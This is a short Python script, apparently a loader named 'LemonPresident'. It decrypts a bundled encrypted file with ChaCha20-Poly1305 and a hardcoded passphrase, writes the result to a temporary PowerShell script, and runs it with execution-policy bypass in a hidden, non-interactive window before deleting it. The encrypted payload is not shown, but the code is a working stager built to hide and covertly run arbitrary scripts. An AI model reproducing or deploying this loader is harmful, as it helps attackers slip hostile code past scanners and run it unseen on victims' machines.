import os
import subprocess
import tempfile
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# This is the new version of LemonPresident. It uses ChaCha20-Poly1305 now rather than a custom algorithm from github.com/BellaTheUni112/cipher-algorithm

ENCRYPTED_FILE = "lemonpresident.enc"
PASSPHRASE = "lemon president"
OUTPUT_EXTENSION = ".ps1"

NONCE_SIZE = 12


def derive_key(passphrase: str, salt: bytes) -> bytes:
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        info=b"file-encryption",
    )
    return hkdf.derive(passphrase.encode())


def run_powershell_script(path):
    subprocess.run([
        "powershell",
        "-nop",
        "-ep", "bypass",
        "-w", "hidden",
        "-noni",
        "-file", path
    ], check=True)


def decrypt_and_open():
    with open(ENCRYPTED_FILE, "rb") as f:
        nonce = f.read(NONCE_SIZE)
        ciphertext = f.read()

    key = derive_key(PASSPHRASE, nonce)
    cipher = ChaCha20Poly1305(key)

    plaintext = cipher.decrypt(nonce, ciphertext, None)

    fd, temp_path = tempfile.mkstemp(suffix=OUTPUT_EXTENSION)
    os.close(fd)

    try:
        with open(temp_path, "wb") as out:
            out.write(plaintext)

        run_powershell_script(temp_path)

    finally:
        os.remove(temp_path)


if __name__ == "__main__":
    decrypt_and_open()
